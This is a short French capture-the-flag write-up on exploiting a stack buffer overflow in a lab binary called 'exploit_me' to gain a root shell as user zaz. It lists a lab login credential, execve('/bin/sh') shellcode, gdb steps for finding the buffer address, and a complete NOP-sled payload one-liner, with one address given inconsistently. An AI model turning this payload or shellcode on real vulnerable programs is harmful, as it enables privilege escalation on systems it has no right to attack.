# Writeup4

## Insertion du SHELLCODE dans notre commande

### 1. Connexion Ã  l'utilisateur ZAZ
* `ssh zaz@192.168.56.101`

* zaz:646da671ca01bb5d84dbb5fb2238dc8e

### 2. SHELLCODE + Trouver l'adresse du buffer

* On recupere un shell code sur shell-storm, cf RAINFALL

1. "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

2. gdb + ctrl+f
```
b main
r 0000
x/200x $esp 
```

![alt text](../scripts/img/image-14.png)


* Adresse buffer : 0xbffff8f8
* En little endian : 0xbffff8f8 = \xf8\xf8\xff\xbf

### 3. Payload 
* Payload form : "[ PADDING NOP POUR BUFFER OVERFLOW] + [ADRESSE DU BUFFER + 150] + ([PADDING NOP]) + [SHELLCODE]"
* Adresse buffer : 0xbffff8b8 = \xf8\xf8\xff\xbf

```sh
./exploit_me $(python -c 'print("\x90" * 140 + "\xf8\xf8\xff\xbf" + "\x31\xdb\x6a\x17\x58\xcd\x80\xf7\xe3\xb0\x0b\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")')
```


* https://beta.hackndo.com/buffer-overflow/
* https://shell-storm.org/shellcode/index.html 
* https://shell-storm.org/shellcode/files/shellcode-516.html.
